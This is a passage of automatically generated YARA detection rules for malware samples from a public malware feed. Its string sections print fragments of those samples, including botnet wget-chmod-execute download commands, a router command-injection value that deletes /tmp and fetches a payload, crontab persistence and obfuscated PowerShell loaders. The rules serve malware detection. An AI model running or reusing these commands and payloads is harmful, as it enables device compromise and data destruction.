      $s13 = "FUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFQABEQABEQABEQABEQABEQABEQABEQAB" ascii /* base64 encoded string 'Q EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ E@ D@ D@ D@ D@ D@ D@ D@ ' */
      $s14 = "RERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s15 = "ADBAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' 0@           ' */
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                        ' */
      $s17 = "DAAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s18 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s19 = "wMgwAKMiaYATKexcng/gAHz81dCerTgDDGAwDCgGGQkxAAAAmgrL/Ykxh4jRGDSPGZsT8YkxisjRGnlOGZMJ5YkxOhjRGbyNGZcb2YkxYUjRGrGNGZsGzYkxiJjRGzRM" ascii
      $s20 = "erTgDiBJEdsCtSwUUQCRHbQXAYGEkQ0xCwJPLyAJEdsPYizfIQCRHrTh0cIBkQ0x2AHMWRCBHDAAAAK7Ba1VTVFzMzMzMzMzMzMzMzMzMDARgyTJ/DHJst4wJyBxDerT" ascii
   condition:
      uint16(0) == 0x413d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule e26e65224caa7856e1dbefb47fea82365877084939cf3d196b299dfd2558b45a {
   meta:
      description = "evidences - file e26e65224caa7856e1dbefb47fea82365877084939cf3d196b299dfd2558b45a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "e26e65224caa7856e1dbefb47fea82365877084939cf3d196b299dfd2558b45a"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s4 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s5 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s6 = "AAAAAEAAAEAAAA" ascii /* base64 encoded string '    @  @  ' */
      $s7 = "AEAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s8 = "AAAAAAAAAAEAA" ascii /* base64 encoded string '       @ ' */
      $s9 = "AFBAAAAAAA" ascii /* base64 encoded string ' P@    ' */
      $s10 = "BAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s11 = "B9FVQllUDJEAIR1ROVETfRERP9VRE90QJ5UVfRFWFR1XTlEAIBldAgETvV1Y05GV4BASJllRlhjZAgURENkRx1GMAg0Q1BASDRVQNNVSN9FSUdkTFx0XPZkTJ91UVRVQ" ascii
      $s12 = "Aa1BqFhTAa1BqFBDAa1BqBR8Aa1BqRAYAa1BqRASAaFAHRB2GYwBg1EGAa1BgNjpAa1Bgdh2Aa1BgViyAa1BgVS3Aa1Bg1RbAa1BgZxbAaFAHRB2GYAAHFTPAYQAaFTR" ascii
      $s13 = "U4g/AUBD+DAEO4PAAAQAg8///r6PAAAA/BSkAUBD+DgDM4PAAAwE+AAAAACIRCQFM4PAOwg/AUhD+jFAAAQAgAQFM4vBAEgfvpAAAQPKBAAA5wYkAUBD+DgDM4vBAEQf" ascii
      $s14 = "m90dllmVwFWbuVFAlxWaGZ2T3VWaWBXYNBQZslmRlZ3bNBQZslmRlRXaydFAlxWaGVGdlxWZEBQZslmRlRXYsBXblRFaAUGbpZUZ0FWZyNEAlx2Zul2UvRFAlx2ZuFGd" ascii
      $s15 = "N/OkraFeSQjHPMQLatEepZ5h0Wq0DDf4AAAAAEg+CkbayFmZhNlLlxGcwFmLt92YR+OdRuPWeR3DMFv79PiJ+WKppkNJG42jy4XqL2rer6mB1uEQ0FSPyy1jO2h9h9wL" ascii
      $s16 = "AAAAHAyXAAAAACSkAMAD+DAAM4PYjBAAAUAIfBAAAAEIRCwAM4PAAwg/gNGAAAwAg8FAAAAIgEJADwg/AAAD+D2YAAAABAyXAAAAQASkAMAD+DAAM4PYiBAAAEAIfBAA" ascii
      $s17 = "EUbSSEAfRUlMcHAdFEnQZUQscMqMtVQgCYDO5VQohUQJSWQiC8ISHUQeC8YH3UQiFI1QnVQeCoiRcXQeFIlSTVQiCoCKTWQeg4vQhWQiggvQxWQkgEfJvXQiCYzKRKQO" ascii
      $s18 = "uVGa0VXQAI3byJXR0NXYMRXZHBgcvJncFJzMul2V0NXYMRXZHBgcv5WaN9FdldGAy9mah10X0V2ZAIXZ6lGbhlmclNFdwlmcjNVY2FmSAIXZ39GTvRFAyV2dllmVkJXY" ascii
      $s19 = "2AgeyE2ditGS28EA5VnN2FWblFkQhREA5RnclB3byBlezBHA5RnclB3byBFdlNFdwlncDJEA5RnclB3byBFdldEdwlncDJEA5RnclB3byBVboRXay92ZsFEdlNFdwlnc" ascii
      $s20 = "V9GVAMDcDtkbKdjWAMjbPFGRPRmQwAwMtVGdJ9FdldGAzAWZsBXdUBwMYRGAzIFSYpVYAMDTVFWWElVWAMjSFZHAzg0Y45GSAMjQ1wkMAMzNwhnTAIDe3YkVhtEAyUHb" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9 {
   meta:
      description = "evidences - file bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */
      $s4 = "AUxiEQ8gAAwIMjOUAAAASW4DAgEJ8N4CrHddVnY35EUAV1Y60xAJ8to/JSAMUpTAerTgD1YMUY7DfQ395AJkQCJkQCJkQCJkQafMIRCTL2eMCR3/7P40pscITf/erTgD" ascii
      $s5 = "4M0b3g0ZhdDe1AjcHJnMndXZZh2cmdEeTBAHiDoHXzWHVtHUMsEiSbclbcZOFTpOK21qWd1qwvkAeHe9R/dkpPW8Ug8X3nzPerTgDWTRAH4FtUtZ5gjh/ktDgzHA9EEZ" ascii
      $s6 = "xAwXkQkxAAAAAsFJEdMAAAAAXRCRHDAAAAwUkQ0xtLFJEZccJAFJEdsZ5xUQExEJEdce2NycIRCRHPkSyYERkQ0xJxlasBEJEdsaO5RJ8QCRHzRUn9FOkQ0xiRVXVQDJ" ascii
      $s7 = "SHDHkQ0i//v/8S4DJXIAEVNANsIBEP4/erTgDLVPofFBEP4/erTgDLlRob1wJerTgDv/f5I6QZciXJlDLCAAAU0xmhBJ8tITkQ3iIRCVLyw6uXXyFamADP4C3erTgDgA" ascii
      $s8 = "gSChrAcMIwerTgDgAAAKFgOBkQUiAAABgQChLSCBJGdAIRCTLOg4BDAAAAKJUu4/erTgDbPSoTAJElIJMkIAAIAwkw4iAAgAhRChNy76BA8gAAgAhRAlIqvwAqcA/H/g" ascii
      $s9 = "TgD6BA8gGZAdIqkxAaNMbbMgGjoRGQliXMnB4PIPetIwxMfdGg/gBA8gAYkBEZMAAAAB4iWSGZ8aIZkxqdkRGvhRGZMAAEAhGiIAAEAAGqIEIGQwDGciAAgB0YpiEve0" ascii
      $s10 = "AAAAAAAAAAAAB" ascii /* base64 encoded string '         ' */
      $s11 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                 ' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
      $s14 = "DAAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s15 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '             ' */
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                     ' */
      $s17 = "FUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQB" ascii /* base64 encoded string 'Q EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ ' */
      $s18 = "REREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D' */
      $s19 = "AAAAAAAABA" ascii /* reversed goodware string 'ABAAAAAAAA' */
      $s20 = "jD8m0BEPEQ8g/3ferTgDCjOUuQgtPA7c9nDJUkoQRQAikQxiIRCTLiPCDQCBoDsAnD8wISAxDerTgDf/53O6Q9vLEZ7DHjIBEP4/9nf/oDl/uQktPQEJ0t4///vFDerT" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24 {
   meta:
      description = "evidences - file 5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24"
   strings:
      $s1 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 &" fullword ascii
      $s2 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p1" fullword ascii
      $s4 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4" fullword ascii
      $s5 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s6 = "crontab /tmp/crontab.tmp" fullword ascii
      $s7 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s8 = "sdwcrjw" fullword ascii
      $s9 = "pnubtoful" fullword ascii
      $s10 = "whpbucndl" fullword ascii
      $s11 = "cbinbc" fullword ascii
      $s12 = "torschpi" fullword ascii
      $s13 = "tbkaubw" fullword ascii
      $s14 = "nidhuubds" fullword ascii
      $s15 = "idhuubds" fullword ascii
      $s16 = "niqfknc" fullword ascii
      $s17 = "Cookie: user=admin" fullword ascii
      $s18 = "tsufdb" fullword ascii
      $s19 = "wuhcIhcb76" fullword ascii
      $s20 = "bifekb" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_3cfbc3e1f311a4292b2677973aea3517789752eb13350bc8fe2dfe3c34801c15 {
   meta:
      description = "evidences - file 3cfbc3e1f311a4292b2677973aea3517789752eb13350bc8fe2dfe3c34801c15.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "3cfbc3e1f311a4292b2677973aea3517789752eb13350bc8fe2dfe3c34801c15"
   strings:
      $x1 = "[System.Text.Encoding]::ascii.(([char[]]@((-6384+(-786+7241)),(-6879+6980),(-9653+9769),(2555-2472),(452748/(10382-6479)),(-525+" ascii
      $s2 = "80ethnCGemJ2eg9CyUG+CdFf6lgGcqoS6UReZ1sbSJQipSQRsfW9DzyTS7MIZ32hc28rVuipZL0J5V+KqRslJZjRbrXT+VKMimoVmWNp0hdI9NjSVfxvAIexEC55J4UB" ascii
      $s3 = "50018976/6924))))),(-9836+9937),(427188/(1544+2860)),(3820-(5859669/(-4836+(12092-(2706+2971)))))))))($q1mjsylxvu4nfg9, ([IO.Com" ascii
      $s4 = "6K8TF8ylp+7rtt3iNYj4GUqpaY0v3SlaleHgKEv8LpCbEINboeYBIM/BEtxKW0oCDLlFe6h8Vctx0y15P2Kw7ZpY8l7wV5F68RTzFUijzRxANpHvvidglDm6d2shIcSQ" ascii
      $s5 = "t4EMETz7GeTwK/UBfEjRItQoHL08QqnsIwzFUVuS36MQ4wRkazdy3MtZCg9Su2djBN7Iho4Ndhn8TsLImI3m4EhNDk67r6XLB56bIwSpKlM/krJNO+ad4bsSd7bvvdEn" ascii
      $s6 = "cso8Wj032ys4Yx76jvBzqwVmyg6qEHfw5itHrlZVrCLoGKWZcT3JhmHMk5ou6683h+xPzjMqpQwRJTSY2a4cvymW5Tp5cMHFQwzl9KawmV+wxrb/0hd8jH38B2S3mVDk" ascii
      $s7 = "lglReYEIde3Z4YbUiPFFkGb39No/HviCbjvN+kKiAvtz3/Q8WFURGVN47jyH6rJnn96qTWz9ksNw2P6zBHzUUqGMMYJ7+/hXInLwf37ym+TjAelQYQvR586bi8FzZdAw" ascii
      $s8 = "pression.CompressionMode]::Decompress))" fullword ascii
      $s9 = "VyPp7oigsammqoFirHPP6EHuGljX8koS7XtMDIYe3dw/eCzxkZX5VXegCS1QoSVkC4WJxEBd1jcIRBCOMSUd1ci1zZptI/gHyXP9d/r8g+MjCKL75Au8FoUe6PZsiuJL" ascii
      $s10 = "bstring(($_ * ([math]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 52)}))(($_ * (6704/(33757992/(18530640/(-5835+(-2465+10140)))" ascii
      $s11 = "0018200000193000002040000021300000197\".Substring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 96)}))($null, $true" ascii
      $s12 = "$igdbarxujcsqkv=$executioncontext;$erederiseresaleninistioninedes = ([chAR[]]@((461789/8713),(10167-(10161-46)),(440667/(16928-(" ascii
      $s13 = "$igdbarxujcsqkv=$executioncontext;$erederiseresaleninistioninedes = ([chAR[]]@((461789/8713),(10167-(10161-46)),(440667/(16928-(" ascii
      $s14 = "MPIY9rY4HSuN1ZlfiKYGR/t9/1lUqNvwa7/vjVEMSYCIvr1xlcU4HhSdMm8CbpEngSOcqWLxNOVo95ZbyhwDTV2wCO+V2GKrZnGlo6zReBwFGEqWZMxOZ2+59IGXhnwG" ascii
      $s15 = "KFDE93isiKKFrRvki5Qr1QIABFO9ucrCRbRJ5DmJXxF9Pxl9TZOmKTLuhuNtPLkOnwA64iJfFknM6VNgKaxP5RXtowWUNhaJKRfYDZrqo0h5OZdErMya3EMEP8PkrpaA" ascii
      $s16 = "4cz4WEhLmPz4Ja5TowxbmsRk8JkX6xwDYcSjfaBc3i+fixfw85qs3tBvjo+csofb605H4Kl+hNZX2vyeolp9vyIzSmB766XRO1cq8FajGUq9R36a03yXm+l1sB2JUuJn" ascii
      $s17 = "zRo0CqB1ptffszTg8ZEE7/qVqvD2UAsLZrKj99iuVrMtfpijU6eBCb0w13hN05u7sdVcQ2T6Gzo7TRJhPWlcgcq35ldcUFgxUhH8FzbkVGK6WFoEyIoB4UBso14GiCrO" ascii
      $s18 = "R6IY+xNc+KZzeJlb4uPSXnX9NirHiqVW052png96qhqK5+gQ8jX/t5Ywbe31S0ADqAGAk+Z7g7FYrDitgrozmcVIijMxQjtmZ6fbnvzsfyNLHbXlUMKT5pODmbbQ/UCB" ascii
      $s19 = "qb6+HJGPyZKDj4XKI5ri+KLdqmktbWZouFqL7KKdCsCDtG9YOj2frLGM0ISAh5TQH74MRNkNVO3yzvNkak+o3hRdYoTcm3PoPwW4DrQoc5sx/Q3LoFpOyo/Hz2Qaz7py" ascii
      $s20 = "mBo/glVEhITCqORMAZa64Q2iFrDleZ8KCWoWCqhu3C3+3eNLKLt7JYApCuoa+Hy9CSK/yUHNck6XyxS8JgHqeaH4lqC/ywTcWtvD5419NpjFq+NKNRPcYEY/hofHpW6g" ascii
   condition:
      uint16(0) == 0x6924 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_6a9d1fddcea756db4858890143b4b9e01616c566cfcc5987a062ce799122925d {
   meta:
      description = "evidences - file 6a9d1fddcea756db4858890143b4b9e01616c566cfcc5987a062ce799122925d.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6a9d1fddcea756db4858890143b4b9e01616c566cfcc5987a062ce799122925d"
   strings:
      $s1 = "[System.Text.Encoding]::ascii.(([system.String]::new(@((8052-7981),(2092-(-8159+(7948+(9611-7409)))),(652732/5627),(379642/(1289" ascii
      $s2 = "00650064006900620068006600680067006700620068006000610067006400680066006800680061006600680067006400670062006800600067006200680061" ascii /* hex encoded string 'edibhfhggbh`agdhfhhafhgdgbh`gbhahgagcfhhhghbh`fhhggfhbh' */
      $s3 = "00680066006800670067006200680060006100670064006800660068006800610066006800670064006700620068006000670062006800610068006700610067" ascii /* hex encoded string 'hfhggbh`agdhfhhafhgdgbh`gbhahgag' */
      $s4 = "Ekzt65XpUuITBHCj9kLIG4vBglNz4XIrouvOPb7sWE8Hz4ora1wgewsJ+gMzZf90ImXkE1P1onGwm6jrC3SVe0vh4NDRhlBHggbkIdllJjkF/YjTASXEK6fKflKe5TAP" ascii
      $s5 = "BqlPhrFHi4Q6GXyirUKI1AKXzSlo2yidEphosTWIx7QQnzcfl3m0y4pd9zxU+uHxYp48+sKXYtziV1qTwMkEK4aqsO4t3joG09JVRXD/Fcx9AOrp2AJGWcHu8sCUfyJo" ascii
      $s6 = "$cqyepshn=$executioncontext;$onbeananorbeedonbeenesonrealaratreis = -join (0..54 | ForEach-Object {[char]([int]\"006500640069006" ascii
      $s7 = "et0SnSmuoPHgzONMVsaX9yAslsY6Jnf6Em7wF5+dWncf29jzLwjEIuStEnORC3WvgiS2Ky52cVU54YLjAxWVo6Ovf3Y88LjqI+xEa57q+RJ2GWDjNUoKZJmS18B3owqP" ascii
      $s8 = "EUtwo9WzUlmok1QhruheGQY3cA+qw5QweS0/TfdfPM6v3jsuBLAaZsdJF1akloghoQhBFJK9zpIBYWhS4icOYohjPTBfqK9wAGcXmrXK7kmUbBhBHfjv4oJLGH52FONw" ascii
      $s9 = ":Pow(2, 1 + 1))) - 12)});$entionisreedesinaredesaltionanoninan = (-jOIN (@((8527-(16739-(46914219/5679))),(-5351+5400),(-4024+(1" ascii
      $s10 = "uhAiC22bj89Suh+Xpu2GwL9mowZGo+rsKpRkotn4s3I15ID5M9NSIlOpKJiUVwQLsK0x+fNp9HElXFI+OUhe4IoJ9cIPRCiyWUnqb26TYE/ey5qHg19s6Kz6fEcThkpk" ascii
      $s11 = "ynbLSLcUvwNLktFjRdPCX1bm1lwUa8B4XKh4HaHBlkWt8P/62Me4Emm+bIo0eFGK7prTngs082T1jGyAGE2TkKnuDUdOOQEQWsiQSr/ORi3sGsCfvvWOlGXqNSejnTd9" ascii
      $s12 = "6QHZkex6qM8jshEFkIIe+fqYE4DckNeAwxyDctf/lfvXXH+HCZOQmpXkba140TBq00DjFUw80zP5vIlAkvf8D920RMYbcEbOMEd8y4XEMDuQsDWFgNHZ+Jhujtl5ev2I" ascii
      $s13 = "uWgSmuvJIGNxrvivQFzNGctJK4a67UuSBmYXobKlDX7vWSzjaqguxu5vxsGiLLF/8+W34eS+BtR2P1yDlPCFN+lLSng7JbqEb83YT87svuYhUyPuZ4gdUqcEMR4xN1gh" ascii
      $s14 = "b2QwRzY0UaEhNWmGsSNvjm7NpRrghlQBWUSSbIS8nMu5Q7GexJqwZNQSGEj7LwkfcBKVvWH3O4gGji8AomEvnpsMOqj/1TQnQ7G7W6i4Vv0W2m0xUMnjzJ9GCSRMWQms" ascii
      $s15 = "3pl6Kd2ANWAg88udWbR7mCsLgIb0Gn/qJr8sOeoMscnDcq7GWSuLmp7u1y+glLFYNZpZteuN/6hVP03XHaGXvQMWzhKWd+cTg652edQIPKTQhblseMcOqcRZ/GcRWe04" ascii
      $s16 = "a6azvZqIKpJGb/ihTHmw7wXveF5+Co80qpbuaUrJY5K016+iK7xuhntw8X95P3ifBAz3P6NjoLci15pPY+rtrK3kSktDFhLG6qR24qKm5WAmw56nR2bnJiZl3vQ60QZQ" ascii
      $s17 = "mqkuoH67+ZnkXZM5t7SKoWjB924ng8jKjoujSnhCjRkZQF8mRbrpVco46LpyZ008CXuuvBIORT+zQPSt2NZfvpdMhvlSaAYbjCJtOGFswDXN7INKK04/eIcUdXhcP/AW" ascii
      $s18 = "QYi/y6yeOPUKV6heHHuOvqbRPWDlDzE1ZxgFGD7Z5IWALIup8SWc26T0xru+tIidgblL4FU1wFwH4XwNXH2wYf1X2/Pp2da9cOR8hUqAR3pE3yPNAr7YU05evZ8iVc6Z" ascii
      $s19 = "$cqyepshn=$executioncontext;$onbeananorbeedonbeenesonrealaratreis = -join (0..54 | ForEach-Object {[char]([int]\"006500640069006" ascii
      $s20 = "PQAltzcjD2x88KeuxopnyRsq5Wy66TDC9R00iTxxp50KUsyFVwhxGrNc3HyQX5x/3jeaOFQ4xJ3r8iW1re9P2Es0T6COUPOiaf/fOBJ75z6Dp17Sba/W1ngYqAYKpOGK" ascii
   condition:
      uint16(0) == 0x6324 and filesize < 60KB and
      8 of them
}

rule c721e2fbcea8e812a6af76f1201514e007e7387b82eb45d2bcc18f7d250c307c {
   meta:
      description = "evidences - file c721e2fbcea8e812a6af76f1201514e007e7387b82eb45d2bcc18f7d250c307c.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "c721e2fbcea8e812a6af76f1201514e007e7387b82eb45d2bcc18f7d250c307c"
   strings:
      $x1 = "    Start-Process powershell.exe -ArgumentList \"-NoProfile\", \"-ExecutionPolicy\", \"Bypass\", \"-File\", \"`\"$PSCommandPath`" ascii
      $x2 = "    Start-Process powershell.exe -ArgumentList \"-NoProfile\", \"-ExecutionPolicy\", \"Bypass\", \"-File\", \"`\"$PSCommandPath`" ascii
      $x3 = "        $process = Start-Process -FilePath \"$BIN\\winws.exe\" -ArgumentList $Arguments -WindowStyle Minimized -PassThru -Workin" ascii
      $x4 = "        $process = Start-Process -FilePath \"$BIN\\winws.exe\" -ArgumentList $Arguments -WindowStyle Minimized -PassThru -Workin" ascii
      $s5 = "$faceinsta = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\faceinsta.txt\"\" --dpi-desync=split2 --dpi-desync-split-seqovl=652 --dpi" ascii
      $s6 = "$DISTCP3 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\discord.txt\"\" --dpi-desync=fake,split --dpi-desync-repeats=6 --dpi-desync" ascii
      $s7 = "$DISTCP2 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\discord.txt\"\" --dpi-desync=split2 --dpi-desync-split-seqovl=652 --dpi-des" ascii
      $s8 = "$DISTCP4 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\discord.txt\"\" --dpi-desync=fake,split2 --dpi-desync-ttl=1 --dpi-desync-au" ascii
      $s9 = "$YT1 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\youtube.txt\"\" --dpi-desync=fake,split2 --dpi-desync-split-seqovl=2 --dpi-desy" ascii
      $s10 = "$DISTCP7 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\discord.txt\"\" --dpi-desync=fake,split2 --dpi-desync-split-seqovl=1 --dpi-" ascii
      $s11 = "157.240.254.63 scontent.cdninstagram.com" fullword ascii
      $s12 = "$other3 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\other.txt\"\" --dpi-desync=fake,multisplit --dpi-desync-split-seqovl=1 --dpi" ascii
      $s13 = "$DISTCP5 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\discord.txt\"\" --dpi-desync=syndata --dpi-desync-fake-syndata=\"\"$BIN\\tl" ascii
      $s14 = "$DISTCP8 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\discord.txt\"\" --dpi-desync=fake,split2 --dpi-desync-split-seqovl=1 --dpi-" ascii
      $s15 = "$YT6 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\youtube.txt\"\" --dpi-desync=fake,split2 --dpi-desync-split-seqovl=1 --dpi-desy" ascii
      $s16 = "$other1 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\other.txt\"\" --dpi-desync=fake,split2 --dpi-desync-split-seqovl=1 --dpi-des" ascii
      $s17 = "$other4 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\other.txt\"\" --dpi-desync=fake,multisplit --dpi-desync-split-seqovl=1 --dpi" ascii
      $s18 = "$YT3 = \"--filter-tcp=443 --hostlist=\"\"$LISTS\\youtube.txt\"\" --dpi-desync=split --dpi-desync-split-seqovl=1 --dpi-desync-spl" ascii
      $s19 = "31.13.72.53 scontent-arn2-1.cdninstagram.com" fullword ascii
      $s20 = "        Start-Process -FilePath \"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk\"" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule dc032be1c81bf6149441b83be4bc12b8cef20255ec60f49e5778968c8004674c {
   meta:
      description = "evidences - file dc032be1c81bf6149441b83be4bc12b8cef20255ec60f49e5778968c8004674c.html"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "dc032be1c81bf6149441b83be4bc12b8cef20255ec60f49e5778968c8004674c"
   strings:
      $s1 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%45%76%48%74%46%75%50%4c%2f%38%57%52%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%KEvHtFuPL/8WR-'%K-'%K-'%K-'' */
      $s2 = "45%35%59%2a%55%26%5c%71%49%3c%54%25%52%48%49%52%3a%4d%56%53%32%51%29%32%58%57%38%36%2d%52%2b%37%6b%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'E5Y*U&\qI<T%RHIR:MVS2Q)2XW86-R+7kcccccccccc' */
      $s3 = "58%5e%26%34%33%31%2e%45%26%2d%28%2b%49%45%35%59%2a%55%26%5c%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'X^&431.E&-(+IE5Y*U&\ccccccccccccccccccccccc' */
      $s4 = "54%46%52%35%59%48%51%2e%38%2d%4b%21%21%6a%6e%3f%27%2c%45%36%41%73%5c%75%75%6e%6a%6c%6c%6a%6c%6c%6c%65%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'TFR5YHQ.8-K!!jn?',E6As\uunjlljllleccccccccc' */
